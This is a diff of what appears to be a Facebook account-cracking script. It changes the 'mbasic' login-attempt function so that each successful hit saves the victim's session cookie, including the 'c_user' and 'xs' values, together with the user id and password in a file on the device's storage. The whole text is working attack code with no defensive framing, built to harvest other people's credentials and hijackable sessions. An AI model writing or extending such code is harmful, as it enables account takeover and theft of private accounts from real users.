@@ -1338,8 +1338,8 @@ def mbasic(uid,pwx,tl):
 					"xs": re.search('"name":"xs","value":"(.*?)"', response.text.replace('\\', '')).group(1),
                 }
                 cookie = ';'.join(f'{key}={value}' for key, value in cokie.items())
-                print(f" {green}(ATOM-OK) {uid}|{pw} ")
-                open("/sdcard/SUMON_file_ok1.txt", "a").write(f"{uid}|{pw}\n")
+                print(f" {green}(ATOM-OK) {uid}|{pw}|{cookie} ")
+                open("/sdcard/SUMON_file_ok1.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
                 oks.append(uid)
                 break
             elif "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
@@ -1351,8 +1351,8 @@ def mbasic(uid,pwx,tl):
 					"xs": re.search('"name":"xs","value":"(.*?)"', response.text.replace('\\', '')).group(1),
                 }
                 cookie = ';'.join(f'{key}={value}' for key, value in cokie.items())
-                print(f" {green}(ATOM-OK) {uid}|{pw} ")
-                open("/sdcard/SUMON_file_ok2.txt", "a").write(f"{uid}|{pw}\n")
+                print(f" {green}(ATOM-OK) {uid}|{pw}|{cookie} ")
+                open("/sdcard/SUMON_file_ok1.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
                 oks.append(uid)
                 break
             elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
